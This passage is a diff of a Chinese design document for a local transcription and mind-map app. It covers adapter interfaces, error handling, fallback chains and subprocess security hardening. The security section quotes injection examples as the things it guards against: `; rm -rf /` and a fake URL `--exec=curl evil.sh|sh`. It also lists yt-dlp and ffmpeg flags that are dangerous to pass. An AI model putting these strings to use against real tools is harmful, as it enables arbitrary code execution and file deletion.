+    durationMs: number;
+    modelId: string;
+    language?: string;
+    prompt?: string;
+    signal: AbortSignal;
+    onProgress(p: number): void;
+  }): Promise<TranscriptSegment[]>; // batch
+  openStream(req: StreamReq): AsrStream; // stream: write(pcm) / on('partial'|'final')
 }
 ```
 
-| 实现 | 进程位置 | 覆盖 | 说明 |
-|---|---|---|---|
-| `WhisperCppEngine` | **子进程** `whisper-cli`（或常驻 `whisper-server`） | batch，全后端 | 主力。ADR-003 决定自建 CI 产二进制。常驻 server 模式省掉每 chunk 的模型加载（大模型加载要数秒），**但 server 必须 `--host 127.0.0.1`** |
-| `SherpaOnnxEngine` | 子进程（Node 侧 runner，`sherpa-onnx-node`） | **stream** + VAD + 说话人分离 | 副引擎。F3 的实时路径唯一选择 |
-| `BrowserWebGpuEngine` | **浏览器 Web Worker**（transformers.js） | batch，零安装 | L0 兜底。见下 |
+| 实现                  | 进程位置                                            | 覆盖                          | 说明                                                                                                                                   |
+| --------------------- | --------------------------------------------------- | ----------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
+| `WhisperCppEngine`    | **子进程** `whisper-cli`（或常驻 `whisper-server`） | batch，全后端                 | 主力。ADR-003 决定自建 CI 产二进制。常驻 server 模式省掉每 chunk 的模型加载（大模型加载要数秒），**但 server 必须 `--host 127.0.0.1`** |
+| `SherpaOnnxEngine`    | 子进程（Node 侧 runner，`sherpa-onnx-node`）        | **stream** + VAD + 说话人分离 | 副引擎。F3 的实时路径唯一选择                                                                                                          |
+| `BrowserWebGpuEngine` | **浏览器 Web Worker**（transformers.js）            | batch，零安装                 | L0 兜底。见下                                                                                                                          |
 
 **`BrowserWebGpuEngine` 的架构处理（本文最非常规的一处设计）**
 
@@ -895,13 +925,19 @@ daemon 侧 BrowserWebGpuEngine 变为"可用"
 ```ts
 interface LlmProvider extends Adapter {
   capabilities(): Promise<{
-    streaming: boolean; structuredOutput: 'json_schema'|'json_mode'|'none';
-    toolUse: boolean; contextWindow: number; vision: boolean;
+    streaming: boolean;
+    structuredOutput: 'json_schema' | 'json_mode' | 'none';
+    toolUse: boolean;
+    contextWindow: number;
+    vision: boolean;
   }>;
   chat(req: {
-    messages: ChatMessage[]; schema?: JsonSchema;   // 有 schema 则强制结构化输出
-    maxTokens?: number; temperature?: number;
-    signal: AbortSignal; onDelta?(t: string): void;
+    messages: ChatMessage[];
+    schema?: JsonSchema; // 有 schema 则强制结构化输出
+    maxTokens?: number;
+    temperature?: number;
+    signal: AbortSignal;
+    onDelta?(t: string): void;
   }): Promise<ChatResult>;
   embed(req: { texts: string[]; modelId: string }): Promise<Float32Array[]>;
 }
@@ -909,10 +945,10 @@ interface LlmProvider extends Adapter {
 
 **关键简化：只需要两个实现。**
 
-| 实现 | 覆盖的后端 |
-|---|---|
+| 实现                                                          | 覆盖的后端                                                                                                                                                                                    |
+| ------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `OpenAiCompatibleProvider`（可配 `baseUrl`/`apiKey`/`model`） | OpenAI、DeepSeek、Groq、xAI、Moonshot、SiliconCloud、OpenRouter、通义、智谱、**Ollama**、**LM Studio**、**内置 llama.cpp `llama-server`** —— 全部暴露 `/v1/chat/completions` `[文档，未实测]` |
-| `AnthropicProvider` | Claude（Messages API 与 OpenAI 格式不同，需要独立实现） |
+| `AnthropicProvider`                                           | Claude（Messages API 与 OpenAI 格式不同，需要独立实现）                                                                                                                                       |
 
 > 这直接对冲 R-01 §C11 #12（memo.ac 只有 OpenAI 能配 baseURL，Ollama 支持有 bug 还要求填不存在的 API Key）。
 > **我们的规则**：`baseUrl` 对所有 provider 都可配；`apiKey` 对本地后端可为空。
@@ -927,8 +963,13 @@ interface LlmProvider extends Adapter {
 ```ts
 interface MindMapRenderer extends Adapter {
   readonly editable: boolean;
-  readonly supports: { freeEdges: boolean; summaries: boolean; perNodeStyle: boolean;
-                       images: boolean; export: ExportFormat[] };
+  readonly supports: {
+    freeEdges: boolean;
+    summaries: boolean;
+    perNodeStyle: boolean;
+    images: boolean;
+    export: ExportFormat[];
+  };
   mount(el: HTMLElement, doc: MindMapDoc, opts): RendererHandle;
   // RendererHandle: update(doc) / applyOps(ops) / on('change', ops=>…) / export(fmt) / destroy()
 }
@@ -936,10 +977,10 @@ interface MindMapRenderer extends Adapter {
 
 **唯一真相是 `MindMapDoc`（D-02 §2），两个渲染器都只是它的消费者** `[已定，ADR-002 决策 3]`。
 
-| 渲染器 | npm 包（**已核实**） | 角色 | 转换 |
-|---|---|---|---|
+| 渲染器               | npm 包（**已核实**）                                                                                                                                                                        | 角色                                                                                    | 转换                                              |
+| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- | ------------------------------------------------- |
 | `MindElixirRenderer` | **`mind-elixir` v5.14.0** —— ⚠️ 注意 npm 包名**不是** `mind-elixir-core`（那是 GitHub 仓库名，npm 上 404）。ADR-002 与 R-03 的写法需按此订正，请 T-011 在 `package.json` 里用 `mind-elixir` | **默认，可编辑**：拖拽、右键菜单、撤销、节点样式、自由连线(`arrows`)、概要(`summaries`) | `toMindElixir(doc)` / `fromMindElixir(data)` 双向 |
-| `MarkmapRenderer` | `markmap-lib@0.18.12` + `markmap-view@0.18.12` + `markmap-common@0.18.9` | 只读视图 + 演示/导出 | **直接构造 `IPureNode` 树**，见下 |
+| `MarkmapRenderer`    | `markmap-lib@0.18.12` + `markmap-view@0.18.12` + `markmap-common@0.18.9`                                                                                                                    | 只读视图 + 演示/导出                                                                    | **直接构造 `IPureNode` 树**，见下                 |
 
 > **[已核实] markmap 的重要发现**：`markmap-lib` 的 `transform(content: string)` **只接受 Markdown 字符串**
 > （内部走 `markdown-it` → HTML → `buildTree`），**不能直接喂 JSON 树**。
@@ -957,19 +998,24 @@ interface MindMapRenderer extends Adapter {
 
 ```ts
 interface MediaSource extends Adapter {
-  match(input: string): number;           // 0 = 不接受；越大越优先
-  probe(input: string, ctx): Promise<MediaInfo>;    // 标题/时长/封面/可选格式，不下载
-  fetch(req: { input: string; destDir: string; preferAudioOnly: boolean;
-               signal: AbortSignal; onProgress(p): void }): Promise<FetchedMedia>;
+  match(input: string): number; // 0 = 不接受；越大越优先
+  probe(input: string, ctx): Promise<MediaInfo>; // 标题/时长/封面/可选格式，不下载
+  fetch(req: {
+    input: string;
+    destDir: string;
+    preferAudioOnly: boolean;
+    signal: AbortSignal;
+    onProgress(p): void;
+  }): Promise<FetchedMedia>;
 }
 ```
 
-| 实现 | `match` 规则 | 依赖 | 许可证 |
-|---|---|---|---|
-| `LocalFileSource` | 本地文件/已上传 asset | ffprobe | — |
-| `DirectHttpSource` | HTTP(S) 且 `Content-Type` 为 audio/video，或扩展名命中，或是 HLS `.m3u8` | 自带 fetch + ffmpeg（HLS） | 无风险 |
-| `RssSource` | `Content-Type: application/rss+xml` / 内容像 RSS | 自带解析 → 展开为 N 个 enclosure → 交给 `DirectHttpSource` | 无风险 |
-| `YtDlpSource` | **兜底**（`match` 返回最低正分），任何 http(s) URL | 子进程 yt-dlp | **GPLv3+**（ADR-002 允许内置） |
+| 实现               | `match` 规则                                                             | 依赖                                                       | 许可证                         |
+| ------------------ | ------------------------------------------------------------------------ | ---------------------------------------------------------- | ------------------------------ |
+| `LocalFileSource`  | 本地文件/已上传 asset                                                    | ffprobe                                                    | —                              |
+| `DirectHttpSource` | HTTP(S) 且 `Content-Type` 为 audio/video，或扩展名命中，或是 HLS `.m3u8` | 自带 fetch + ffmpeg（HLS）                                 | 无风险                         |
+| `RssSource`        | `Content-Type: application/rss+xml` / 内容像 RSS                         | 自带解析 → 展开为 N 个 enclosure → 交给 `DirectHttpSource` | 无风险                         |
+| `YtDlpSource`      | **兜底**（`match` 返回最低正分），任何 http(s) URL                       | 子进程 yt-dlp                                              | **GPLv3+**（ADR-002 允许内置） |
 
 **可替换性的具体保证**（这是 ADR-002 明确要求写入 D-01 的回滚路径）：
 
@@ -989,38 +1035,39 @@ interface MediaSource extends Adapter {
 
 每个错误有稳定的 `code`（`SCREAMING_SNAKE`），映射到四元组 `{ 严重度, 是否可重试, 用户可读文案 key, remediation 动作 }`：
 
-| 类 | 前缀 | 处理基调 | 例 |
-|---|---|---|---|
-| 用户输入 | `INPUT_*` | 立即 400，指出哪个字段 | `INPUT_URL_INVALID`, `INPUT_UNSUPPORTED_FORMAT` |
-| 前置条件缺失 | `MISSING_*` | job → `blocked` + 可点击修复 | `MISSING_ASR_MODEL`, `MISSING_BACKEND`, `MISSING_LLM_CONFIG` |
-| 资源不足 | `RESOURCE_*` | 降级重试一次，仍失败则 blocked | `RESOURCE_DISK_FULL`, `RESOURCE_VRAM_OOM` |
-| 外部服务 | `UPSTREAM_*` | 退避重试 → 换源/换 provider | `UPSTREAM_TIMEOUT`, `UPSTREAM_RATE_LIMITED`, `UPSTREAM_AUTH` |
-| 子进程 | `PROC_*` | 判定崩溃 vs 正常失败；崩溃计入熔断 | `PROC_CRASHED`, `PROC_TIMEOUT`, `PROC_BAD_EXIT` |
-| 数据完整性 | `DATA_*` | **绝不静默继续** | `DATA_CHECKSUM_MISMATCH`, `DATA_SCHEMA_TOO_NEW` |
-| 内部缺陷 | `INTERNAL_*` | 500 + 记录完整栈 + 提示"导出诊断包" | — |
+| 类           | 前缀         | 处理基调                            | 例                                                           |
+| ------------ | ------------ | ----------------------------------- | ------------------------------------------------------------ |
+| 用户输入     | `INPUT_*`    | 立即 400，指出哪个字段              | `INPUT_URL_INVALID`, `INPUT_UNSUPPORTED_FORMAT`              |
+| 前置条件缺失 | `MISSING_*`  | job → `blocked` + 可点击修复        | `MISSING_ASR_MODEL`, `MISSING_BACKEND`, `MISSING_LLM_CONFIG` |
+| 资源不足     | `RESOURCE_*` | 降级重试一次，仍失败则 blocked      | `RESOURCE_DISK_FULL`, `RESOURCE_VRAM_OOM`                    |
+| 外部服务     | `UPSTREAM_*` | 退避重试 → 换源/换 provider         | `UPSTREAM_TIMEOUT`, `UPSTREAM_RATE_LIMITED`, `UPSTREAM_AUTH` |
+| 子进程       | `PROC_*`     | 判定崩溃 vs 正常失败；崩溃计入熔断  | `PROC_CRASHED`, `PROC_TIMEOUT`, `PROC_BAD_EXIT`              |
+| 数据完整性   | `DATA_*`     | **绝不静默继续**                    | `DATA_CHECKSUM_MISMATCH`, `DATA_SCHEMA_TOO_NEW`              |
+| 内部缺陷     | `INTERNAL_*` | 500 + 记录完整栈 + 提示"导出诊断包" | —                                                            |
 
 **`remediation` 是一等公民**：每个 `MISSING_*` / `RESOURCE_*` 错误都**必须**带一个 UI 能直接渲染成按钮的动作对象（§3.5）。
 理由：章程要求 2.1/2.2 是"用户不碰命令行"。如果出错时只能给一段"请安装 CUDA 后端"的文字，用户还是得去查文档 —— 那就等于没做到。
 
 ### 7.2 降级矩阵
 
-| 场景 | 降级链 | 用户可见性 |
-|---|---|---|
-| GPU 后端加载失败 | `cuda → vulkan → cpu` | 一次性提示"已切换到 X（原因：Y）"，并在运行时页面标红失败项 |
-| 后端 probe 超时/崩溃 | 直接判定不可用（**不重试**，Ollama 有 AMD 驱动过旧时挂死的先例，R-02 §A.0） | 运行时页面显示"探测超时" |
-| ASR 引擎不可用 | `whisper.cpp → sherpa-onnx → browser-webgpu → blocked` | 首次切换时询问；之后记住 |
-| 模型太大装不下 | 提示换更小量化（ADR-004 差异化点 1/2） | fit 徽标 `Fits / May be slow / Won't fit` |
-| VRAM OOM | 自动重试一次：换 CPU 后端 or 更小量化 | 明确说明"因显存不足已降级" |
-| LLM 云 API 失败 | `云 → 本地 llama → 启发式大纲` | 见下 |
-| **完全没有 LLM** | **启发式大纲**：按转写段落的停顿长度 + 句末标点 + 关键词密度切主题，生成 2~3 层大纲 | 明确标注"未使用 AI，仅为结构化草稿"，并提示配置 LLM 可获得更好效果 |
-| yt-dlp 失败（反爬/需登录） | 提示两条出路：① 启用"从浏览器读 cookie"；② **引导走 F2**（用户自己下载后拖进来） | 给两个按钮 |
-| 中文分词扩展（libsimple）加载失败 | FTS5 降级为内置 `trigram` tokenizer（中文可用，只是效果差些） | 设置页提示 |
-| sqlite-vec 加载失败 / 索引格式变更 | 关闭语义搜索，关键词搜索照常；索引视为可重建缓存（D-02 §4.4） | 搜索页灰掉"语义"开关 |
-| 磁盘满 | 暂停所有下载与转码，job 转 `blocked` | 顶部持久条幅 + 一键"清理缓存" |
-| SSE 断开 | `EventSource` 自动重连 + `Last-Event-ID` 重放；仍失败则**降级为 5s 轮询** | 顶部"连接中断，正在重连" |
-| daemon 反复崩溃 | 安全模式（§2.7 D） | 诊断页 |
+| 场景                               | 降级链                                                                              | 用户可见性                                                         |
+| ---------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
+| GPU 后端加载失败                   | `cuda → vulkan → cpu`                                                               | 一次性提示"已切换到 X（原因：Y）"，并在运行时页面标红失败项        |
+| 后端 probe 超时/崩溃               | 直接判定不可用（**不重试**，Ollama 有 AMD 驱动过旧时挂死的先例，R-02 §A.0）         | 运行时页面显示"探测超时"                                           |
+| ASR 引擎不可用                     | `whisper.cpp → sherpa-onnx → browser-webgpu → blocked`                              | 首次切换时询问；之后记住                                           |
+| 模型太大装不下                     | 提示换更小量化（ADR-004 差异化点 1/2）                                              | fit 徽标 `Fits / May be slow / Won't fit`                          |
+| VRAM OOM                           | 自动重试一次：换 CPU 后端 or 更小量化                                               | 明确说明"因显存不足已降级"                                         |
+| LLM 云 API 失败                    | `云 → 本地 llama → 启发式大纲`                                                      | 见下                                                               |
+| **完全没有 LLM**                   | **启发式大纲**：按转写段落的停顿长度 + 句末标点 + 关键词密度切主题，生成 2~3 层大纲 | 明确标注"未使用 AI，仅为结构化草稿"，并提示配置 LLM 可获得更好效果 |
+| yt-dlp 失败（反爬/需登录）         | 提示两条出路：① 启用"从浏览器读 cookie"；② **引导走 F2**（用户自己下载后拖进来）    | 给两个按钮                                                         |
+| 中文分词扩展（libsimple）加载失败  | FTS5 降级为内置 `trigram` tokenizer（中文可用，只是效果差些）                       | 设置页提示                                                         |
+| sqlite-vec 加载失败 / 索引格式变更 | 关闭语义搜索，关键词搜索照常；索引视为可重建缓存（D-02 §4.4）                       | 搜索页灰掉"语义"开关                                               |
+| 磁盘满                             | 暂停所有下载与转码，job 转 `blocked`                                                | 顶部持久条幅 + 一键"清理缓存"                                      |
+| SSE 断开                           | `EventSource` 自动重连 + `Last-Event-ID` 重放；仍失败则**降级为 5s 轮询**           | 顶部"连接中断，正在重连"                                           |
+| daemon 反复崩溃                    | 安全模式（§2.7 D）                                                                  | 诊断页                                                             |
 
 **降级三原则**
+
 1. **降级必须可见**：绝不静默换后端/换模型 —— 用户会以为产品变慢/变差是玄学。
 2. **降级必须可回退**：记录"因为 X 失败所以降到 Y"，问题修复后（如装上后端）自动提示"可恢复到 X"。
 3. **降级不能级联成雪崩**：熔断器（下节）。
@@ -1049,13 +1096,13 @@ interface MediaSource extends Adapter {
 
 ### 8.1 网络暴露面
 
-| 措施 | 细节 |
-|---|---|
-| 绑定 | `127.0.0.1` only；**永不 `0.0.0.0`/`::`** `[已定，ADR-003]`。CI 加一条 grep 断言禁止 `0.0.0.0` 字面量出现在 `apps/daemon` |
-| 子进程监听 | 任何会监听端口的子进程（`whisper-server`、`llama-server`）**必须显式传 `--host 127.0.0.1`** —— memo.ac 的 `whisper-server` 用了默认 `0.0.0.0`（R-01 §B9），是我们明确要避开的错误 |
-| 端口 | 随机高端口 + 只在 `runtime.json`(0600) 公布 |
-| CORS | **不需要**：SPA 由 daemon 同 origin 托管。CORS 策略 = 全部拒绝（不设 `Access-Control-Allow-Origin`），跨源请求天然被浏览器拦 |
-| CSP | `default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self' data: blob:; media-src 'self' blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` —— 顺带把 clickjacking 也挡了 |
+| 措施       | 细节                                                                                                                                                                                                      |
+| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| 绑定       | `127.0.0.1` only；**永不 `0.0.0.0`/`::`** `[已定，ADR-003]`。CI 加一条 grep 断言禁止 `0.0.0.0` 字面量出现在 `apps/daemon`                                                                                 |
+| 子进程监听 | 任何会监听端口的子进程（`whisper-server`、`llama-server`）**必须显式传 `--host 127.0.0.1`** —— memo.ac 的 `whisper-server` 用了默认 `0.0.0.0`（R-01 §B9），是我们明确要避开的错误                         |
+| 端口       | 随机高端口 + 只在 `runtime.json`(0600) 公布                                                                                                                                                               |
+| CORS       | **不需要**：SPA 由 daemon 同 origin 托管。CORS 策略 = 全部拒绝（不设 `Access-Control-Allow-Origin`），跨源请求天然被浏览器拦                                                                              |
+| CSP        | `default-src 'self'; script-src 'self'; connect-src 'self'; img-src 'self' data: blob:; media-src 'self' blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` —— 顺带把 clickjacking 也挡了 |
 
 ### 8.2 鉴权与 CSRF / DNS rebinding
 
@@ -1069,6 +1116,7 @@ interface MediaSource extends Adapter {
 4. **双提交 CSRF token**：非 GET 请求需带 `X-OpenMemo-CSRF`，值与 session 绑定。cookie 设 `SameSite=Strict; HttpOnly; Path=/`。
 
 补充：
+
 - **session 与 token 分离**：cookie 里是 sid（可单独撤销），不是原始 token。设置页有"注销所有浏览器"。
 - **`GET` 也要防**：`/media/**` 是 GET 且靠 cookie，恶意网页理论上可以 `<audio src="http://127.0.0.1:17650/media/asset/…">` 偷内容 —— 但它需要先猜中 uid（ULID，128 bit）**且**猜中端口。再加 `Sec-Fetch-Dest`/`Sec-Fetch-Site` 校验（媒体请求必须是 same-origin）作为第二层 `[设计]`。
 
@@ -1091,15 +1139,15 @@ interface MediaSource extends Adapter {
 ⚠️ **在此之前它只是约定。此前这里写着"CI 用 `no-restricted-imports` 强制，`apps/daemon/src/subprocess/**` 之外禁止 import `node:child_process`" —— 那条 lint 规则从未存在于 `eslint.config.js`（当时全文 115 行，`child_process` 零命中），`apps/daemon/src/subprocess/` 这个目录也不存在。** 保留这句是因为 `SECURITY.md:109` 与 `D-06:330` 曾与它互相引用，形成"看起来被三处证实"的假象；下一个人需要知道**这里改过**。
 `[实测]` 2026-08-06（AST 剥注释后全仓扫描，非 grep）：**产品代码 7 处** import `node:child_process`，**除 `runner.ts` 自己外还有 6 处** —— 这 7 处就是白名单的全部内容：
 
-| 文件 | 性质 |
-|---|---|
-| `packages/pipeline/src/subprocess/runner.ts` | ✅ 权威出口（本段说的那一个） |
-| `apps/daemon/src/main.ts` | detached 自重启，runner 没有对应能力 —— 合理例外 |
-| `apps/daemon/src/bootstrap/tls.ts` | 启动时 `execFileSync('openssl')`，同步/异步差异让复用别扭 |
+| 文件                                         | 性质                                                                                                              |
+| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
+| `packages/pipeline/src/subprocess/runner.ts` | ✅ 权威出口（本段说的那一个）                                                                                     |
+| `apps/daemon/src/main.ts`                    | detached 自重启，runner 没有对应能力 —— 合理例外                                                                  |
+| `apps/daemon/src/bootstrap/tls.ts`           | 启动时 `execFileSync('openssl')`，同步/异步差异让复用别扭                                                         |
 | `packages/pipeline/src/asr/whisperServer.ts` | **违反本包自己的不变量**（长驻服务 vs run-to-completion），已 import runner 的 `buildChildEnv` 并传 `shell:false` |
-| `packages/runtime/src/probe/runProbe.ts` | ⚠️ **架构上修不了**：`pipeline` 依赖 `runtime`，反过来不行 |
-| `packages/runtime/src/detect/system.ts` | 同上 |
-| `packages/runtime/src/selfTest.ts` | 同上 |
+| `packages/runtime/src/probe/runProbe.ts`     | ⚠️ **架构上修不了**：`pipeline` 依赖 `runtime`，反过来不行                                                        |
+| `packages/runtime/src/detect/system.ts`      | 同上                                                                                                              |
+| `packages/runtime/src/selfTest.ts`           | 同上                                                                                                              |
 
 **全仓 19 处**（上面 7 处 + 12 个 `scripts/` 与 `verify-*.mjs`），其中
 `packages/downloader/scripts/verify-offline.mjs` 用的是 **`await import('node:child_process')` 动态 import —— 任何静态 lint 规则都抓不到**。
@@ -1110,27 +1158,30 @@ interface MediaSource extends Adapter {
 
 #### T-153：规则落地后的真实边界（**读到这里请连这三条一起读**）
 
-| | |
-|---|---|
-| **规则位置** | `eslint.config.js`，一个 `files: ['apps/daemon/src/**', 'packages/*/src/**']` 的块 + 一个 7 文件的白名单块 |
-| **执行者** | `pnpm lint`（根 `package.json` 的 `lint` / `check`）。护栏测试 `packages/pipeline/src/subprocess/__tests__/childProcessAllowlist.test.ts` 会**真的 spawn 一次 eslint** 来验证它生效，走的是 `pnpm -r test` 这条事实上的门禁 |
-| **① 范围只到产品源码** | `scripts/**`、`verify-*.mjs`、`*.test.ts`、`__tests__/**` **不在范围内**。它们不随产品分发、spawn 的是钉死的命令。把它们一起禁掉只会逼出十几条 `eslint-disable`，而那等于没有规则 |
-| **② `apps/web/**` 刻意不在范围内** | 不是遗漏：flat config 里同名规则是**整体覆盖不是合并**，把 web 圈进来会让这一块**悄悄吃掉**两条前端分层护栏（`D-05 §3.5`）。护栏测试里有一条专门断言那两条仍然会报错 —— `[实测]` 把范围改成含 web，那条当场红 |
-| **③ 🔴 它拦不住动态 import** | `packages/downloader/scripts/verify-offline.mjs:640` 是 `const { execFileSync } = await import('node:child_process')`。**任何静态 lint 规则都抓不到它**，`[实测]` 该文件在新规则下零命中（而且它本来也在范围外）。护栏测试里有一条断言**专门钉住这个盲区**，就是为了防止下一份文档因为"有规则了"再次把这一格写成满格 |
+|                                    |                                                                                                                                                                                                                                                                                                                      |
+| ---------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **规则位置**                       | `eslint.config.js`，一个 `files: ['apps/daemon/src/**', 'packages/*/src/**']` 的块 + 一个 7 文件的白名单块                                                                                                                                                                                                           |
+| **执行者**                         | `pnpm lint`（根 `package.json` 的 `lint` / `check`）。护栏测试 `packages/pipeline/src/subprocess/__tests__/childProcessAllowlist.test.ts` 会**真的 spawn 一次 eslint** 来验证它生效，走的是 `pnpm -r test` 这条事实上的门禁                                                                                          |
+| **① 范围只到产品源码**             | `scripts/**`、`verify-*.mjs`、`*.test.ts`、`__tests__/**` **不在范围内**。它们不随产品分发、spawn 的是钉死的命令。把它们一起禁掉只会逼出十几条 `eslint-disable`，而那等于没有规则                                                                                                                                    |
+| **② `apps/web/**` 刻意不在范围内** | 不是遗漏：flat config 里同名规则是**整体覆盖不是合并**，把 web 圈进来会让这一块**悄悄吃掉**两条前端分层护栏（`D-05 §3.5`）。护栏测试里有一条专门断言那两条仍然会报错 —— `[实测]` 把范围改成含 web，那条当场红                                                                                                        |
+| **③ 🔴 它拦不住动态 import**       | `packages/downloader/scripts/verify-offline.mjs:640` 是 `const { execFileSync } = await import('node:child_process')`。**任何静态 lint 规则都抓不到它**，`[实测]` 该文件在新规则下零命中（而且它本来也在范围外）。护栏测试里有一条断言**专门钉住这个盲区**，就是为了防止下一份文档因为"有规则了"再次把这一格写成满格 |
 
 **所以本节 L1 现在的准确说法是**：「产品源码里 `node:child_process` 只能出现在上表 7 个文件中，由 lint 强制；构建脚本与动态 import 不在强制范围内。」
 **不是**「全项目唯一 spawn 出口」。那句话今天仍然不成立 —— 差的是 `whisperServer.ts` 那条真债（长驻服务 vs run-to-completion）与 `packages/runtime` 的依赖方向，两条都在上表里记着。
 
 **第二层：绝不经过 shell**
+
 ```
 ✅  spawn(absoluteBin, argv[], { shell: false, ... })
 ❌  exec / execSync / spawn(..., {shell:true}) / 任何模板字符串拼命令
 ```
+
 → 这消灭了 `; rm -rf /`、`$(…)`、反引号、`&&`、管道这一整类经典 shell 注入。
 **Windows 额外规则**：Node 在 Windows 上执行 `.bat`/`.cmd` 时**必须**经 `cmd.exe`（这正是 CVE-2024-27980 的成因）→ **二进制 allowlist 只允许 `.exe`，禁止 `.bat`/`.cmd`/`.ps1`**。
 
 **第三层：`shell:false` 挡不住的——参数注入**
 即使不经 shell，`argv[]` 里一个以 `-` 开头的元素仍会被目标程序当成**选项**。用户完全可以粘贴 `--exec=curl evil.sh|sh` 当作"URL"。
+
 ```
 1. URL 必须 new URL() 解析成功；scheme ∈ {http, https}（拒绝 file:/ftp:/data:/javascript:）
 2. 拒绝含凭据（user:pass@）的 URL
@@ -1147,19 +1198,20 @@ interface MediaSource extends Adapter {
 
 **第四层：关掉工具自身的危险面**（这一层最容易被遗漏）
 
-| 工具 | 必须强制的参数 | 原因 |
-|---|---|---|
-| yt-dlp | `--ignore-config`（或 `--no-config-locations`） | **不读用户目录/系统的 `yt-dlp.conf`** —— 否则攻击者只要能写一个配置文件，就能注入 `--exec` |
-| yt-dlp | 固定 `--paths <我们的 tmp>`、`-o` 用**常量模板**（如 `%(id)s.%(ext)s`，且 id 会被 yt-dlp 自己 sanitize） | 输出路径绝不含用户可控串 |
-| yt-dlp | **绝不传** `--exec` / `--load-info-json` / `--batch-file` / `--cookies <用户路径>` | 这些都是任意执行/任意读文件的入口 |
-| yt-dlp | `--no-playlist`（除非用户显式要整个播放列表）、`--max-downloads`、`--max-filesize` | 防止一个 URL 变成 5000 个文件 |
-| ffmpeg | 输入路径一律**绝对路径**（自然不以 `-` 开头）；仍显式加 `--` 不适用 → 用 `-i ./relative` 形式兜底 | 防 `-` 开头文件名 |
-| ffmpeg | `-nostdin`（否则会抢终端 stdin 挂死）、`-y`、`-hide_banner`、`-loglevel error` | 稳定性 |
-| ffmpeg | 处理**远程 URL** 时加 `-protocol_whitelist file,crypto,https,tls,tcp`（按需最小集） | 防 `concat:`/`subfile:`/本地文件读取协议滥用 |
-| ffmpeg | **用户可控字符串绝不进 `-filter_complex` / `-vf` / `-metadata`** | filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是第二套注入面 |
-| whisper-cli | `--prompt` 内容是用户可控的**但作为单个 argv 元素**是安全的；长度截断 ≤ 1024 | 防超长 argv（Linux `MAX_ARG_STRLEN` = 128KB）|
+| 工具        | 必须强制的参数                                                                                           | 原因                                                                                       |
+| ----------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
+| yt-dlp      | `--ignore-config`（或 `--no-config-locations`）                                                          | **不读用户目录/系统的 `yt-dlp.conf`** —— 否则攻击者只要能写一个配置文件，就能注入 `--exec` |
+| yt-dlp      | 固定 `--paths <我们的 tmp>`、`-o` 用**常量模板**（如 `%(id)s.%(ext)s`，且 id 会被 yt-dlp 自己 sanitize） | 输出路径绝不含用户可控串                                                                   |
+| yt-dlp      | **绝不传** `--exec` / `--load-info-json` / `--batch-file` / `--cookies <用户路径>`                       | 这些都是任意执行/任意读文件的入口                                                          |
+| yt-dlp      | `--no-playlist`（除非用户显式要整个播放列表）、`--max-downloads`、`--max-filesize`                       | 防止一个 URL 变成 5000 个文件                                                              |
+| ffmpeg      | 输入路径一律**绝对路径**（自然不以 `-` 开头）；仍显式加 `--` 不适用 → 用 `-i ./relative` 形式兜底        | 防 `-` 开头文件名                                                                          |
+| ffmpeg      | `-nostdin`（否则会抢终端 stdin 挂死）、`-y`、`-hide_banner`、`-loglevel error`                           | 稳定性                                                                                     |
+| ffmpeg      | 处理**远程 URL** 时加 `-protocol_whitelist file,crypto,https,tls,tcp`（按需最小集）                      | 防 `concat:`/`subfile:`/本地文件读取协议滥用                                               |
+| ffmpeg      | **用户可控字符串绝不进 `-filter_complex` / `-vf` / `-metadata`**                                         | filter 语法有自己的转义规则（`:` `,` `[` `]` `'` `\`），是第二套注入面                     |
+| whisper-cli | `--prompt` 内容是用户可控的**但作为单个 argv 元素**是安全的；长度截断 ≤ 1024                             | 防超长 argv（Linux `MAX_ARG_STRLEN` = 128KB）                                              |
 
 **第五层：进程环境与资源**
+
 ```
 env:      最小白名单（PATH 指向我们的 bin/、HOME、TMPDIR、必要的 LANG）
           显式剔除 LD_PRELOAD / LD_LIBRARY_PATH / DYLD_* / NODE_OPTIONS / PYTHONPATH
@@ -1170,6 +1222,7 @@ uid/gid:  保持当前用户（不提权）；未来可考虑 Linux 上加 secco
 ```
 
 **第六层：不变量（写进代码审查清单）**
+
 > **任何用户可控字符串，只能作为一个完整、独立的 `argv` 元素传递；
 > 绝不允许被拼接进另一个参数的内部，也绝不允许成为参数名。**
 
@@ -1193,6 +1246,7 @@ uid/gid:  保持当前用户（不提权）；未来可考虑 Linux 上加 secco
 **扩展名与 MIME**：白名单（音视频扩展名 + 字幕），且以 **magic bytes / ffprobe 实探**为准，不信任用户给的 MIME 或扩展名。
 
 **解压防护**（GPU 后端包是 zip/tar）：
+
 ```
 - Zip-Slip：每个条目路径按上面 1-4 校验后才写
 - 拒绝所有 symlink / hardlink 条目
@@ -1206,15 +1260,15 @@ uid/gid:  保持当前用户（不提权）；未来可考虑 Linux 上加 secco
 
 ### 8.6 其它
 
-| 项 | 措施 |
-|---|---|
-| **API Key 存储** | **待 Manager 决策**（§9 决策项 1）。默认方案：存 SQLite 的 `secrets` 表，文件 0600 / 目录 0700，UI **明确告知"未加密存储"**；不写日志、不进诊断包、不出现在 API 响应（只返回 `sk-…abcd` 掩码） |
-| **下载物完整性** | 一律 SHA256 校验后才算安装 `[已定，ADR-004 决策 5，GPT4All 范式]`；**判重按 SHA256 不按体积** `[已定，ADR-004 决策 4]` |
-| **目录签名** | 远程模型目录 JSON 用 Ed25519 签名，公钥硬编码 `[R-04 §10.3 已提出]` |
-| **ad-hoc 签名** | macOS 下载的二进制 `codesign -s -` + `xattr -dr com.apple.quarantine` `[已定，ADR-003 决策 4]`。**注意**：这条命令的参数里有路径，同样走 `SubprocessRunner` 的路径校验 |
